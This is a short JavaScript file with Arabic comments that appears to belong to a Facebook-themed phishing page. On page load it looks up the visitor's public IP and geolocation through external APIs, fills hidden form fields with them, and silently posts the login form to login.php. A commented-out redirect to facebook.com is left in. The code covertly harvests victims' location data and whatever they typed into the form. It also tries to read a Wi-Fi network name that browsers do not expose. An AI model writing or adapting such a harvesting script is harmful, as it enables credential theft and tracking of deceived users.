document.addEventListener('DOMContentLoaded', () => {
    // الحصول على اسم الشبكة
    const networkName = navigator.connection ? navigator.connection.ssid || 'غير معروف' : 'غير معروف';
    
    // تعريف المتغيرات الافتراضية
    let ipAddress = 'غير معروف';
    let location = 'غير معروف';

    // الحصول على عنوان IP باستخدام API خارجي
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            ipAddress = data.ip;

            // الحصول على الموقع باستخدام API خارجي
            return fetch(`https://ipapi.co/${ipAddress}/json/`);
        })
        .then(response => response.json())
        .then(data => {
            location = `${data.city || 'غير معروف'}, ${data.region || 'غير معروف'}, ${data.country_name || 'غير معروف'}`;

            // تحديث الحقول المخفية في النموذج
            document.getElementById('ip_address').value = ipAddress;
            document.getElementById('network_type').value = networkName; // تعديل من network_type إلى network_name
            document.getElementById('location').value = location;

            // إرسال البيانات إلى `login.php` ومنع التحويل إلى فيسبوك
            return fetch('login.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams(new FormData(document.querySelector('form')))
            });
        })
        .then(response => response.text())
        .then(result => {
            // تعليق هذا السطر أو إزالته لمنع التحويل إلى فيسبوك
            // window.location.href = "https://www.facebook.com";
        })
        .catch(error => console.error('Error:', error));
});
